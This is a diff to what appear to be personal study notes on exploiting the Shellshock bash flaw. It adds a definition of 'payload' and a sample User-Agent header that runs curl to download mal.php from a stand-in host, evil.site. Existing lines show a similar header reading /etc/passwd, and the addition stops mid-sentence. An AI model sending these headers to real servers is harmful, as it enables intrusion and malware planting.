@@ -337,7 +337,7 @@ Response codes: `200` ok, `400` error, `500` server error, `300` is redirect
     - Send and receive shells to and from the target
     - Backdoor the victim
 
-- Command syntax `/bin/bash -c 'command'`
+- Command syntax `/bin/bash -c 'command'`. Note that a code contained in the bash script that is used for exploitation is called **payload**
 
 - you can alter the script using shell shock. For example:
 
@@ -367,6 +367,16 @@ Response codes: `200` ok, `400` error, `500` server error, `300` is redirect
    User-Agent: () { :;}; /bin/bash -c 'cat /etc/passwd'
    Connection: keep-alive
    ```
+
+- likewise other ways of exploiting the code include downloading a file from a website
+```
+     User-Agent: () { :;}; /bin/bash -c 'curl -O http://evil.site/mal.php'
+
+     -O downloads and saves the file with url name
+```
+
+- We can 
+
 
 
 
